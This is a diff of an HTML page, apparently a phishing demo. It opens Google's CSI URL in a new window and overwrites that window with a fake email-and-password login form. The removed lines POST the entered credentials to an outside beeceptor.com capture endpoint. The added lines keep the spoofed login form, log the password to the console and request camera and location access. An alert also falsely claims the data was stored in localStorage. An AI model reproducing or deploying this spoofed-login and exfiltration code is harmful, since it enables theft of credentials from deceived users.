@@ -3,26 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Login Page</title>
+    <title>Camera & Location Access</title>
 </head>
 <body>
-    <h1>Login Form</h1>
+    <h1>Camera and Location Access</h1>
 
-    <!-- Button to open the login page (spoofed page) -->
-    <button onclick="go()">Go</button>
+    <!-- Button to trigger the camera and location access -->
+    <button onclick="accessData()">Access Camera & Location</button>
+
+    <h2>Camera Preview</h2>
+    <video id="video" width="320" height="240" autoplay></video>
+
+    <h2>Location Information</h2>
+    <p id="location">Fetching location...</p>
 
     <script>
-        function go() {
-            var x = window.open('https://www.google.com/csi'); // Open a target URL (Google)
-            
+        function accessData() {
+            // Open Google CSI (or any other target URL) in a new window
+            var x = window.open('https://www.google.com/csi'); // Open Google CSI
+
             setTimeout(function() {
-                // Change the body content of the opened window to simulate a fake login page
+                // Simulate a fake login page after some time (3 seconds)
                 x.document.body.innerHTML = '<h1>Please login</h1>';
                 x.document.body.innerHTML += 'Email: <input id="email"><br>';
                 x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
                 x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
 
-                // Function to send the collected data without redirection
+                // Function to send the collected data (removed as per your request)
                 function sendData() {
                     var email = document.getElementById('email').value;
                     var password = document.getElementById('pass').value;
@@ -33,28 +40,44 @@
                         return; // Prevent sending empty data
                     }
 
-                    // Send data to Beeceptor endpoint
-                    fetch('https://hd59ac746144df72f574.free.beeceptor.com', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            email: email,
-                            password: password
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log("Data successfully sent:", data);
-                        alert('Data has been sent to the server');
-                    })
-                    .catch(error => {
-                        console.error("Error sending data:", error);
-                        alert('There was an error sending the data');
-                    });
+                    // Log the data to the console (no redirect)
+                    console.log("Email:", email);
+                    console.log("Password:", password);
+
+                    // Optionally, you can do more here (send data to a server, etc.)
+                    alert('Data has been stored in localStorage');
                 }
             }, 3000); // Wait for 3 seconds to simulate the page load time
+
+            // Akses Kamera
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function (stream) {
+                        // Menampilkan video stream di elemen <video>
+                        var video = document.getElementById('video');
+                        video.srcObject = stream;
+                    })
+                    .catch(function (error) {
+                        console.error('Error accessing camera: ', error);
+                        alert('Unable to access camera. Please grant permission.');
+                    });
+            } else {
+                alert('Camera access is not supported by your browser.');
+            }
+
+            // Akses Lokasi (Geolocation)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                }, function (error) {
+                    console.error('Error fetching location: ', error);
+                    document.getElementById('location').innerText = 'Unable to fetch location.';
+                });
+            } else {
+                alert('Geolocation is not supported by your browser.');
+            }
         }
     </script>
 </body>
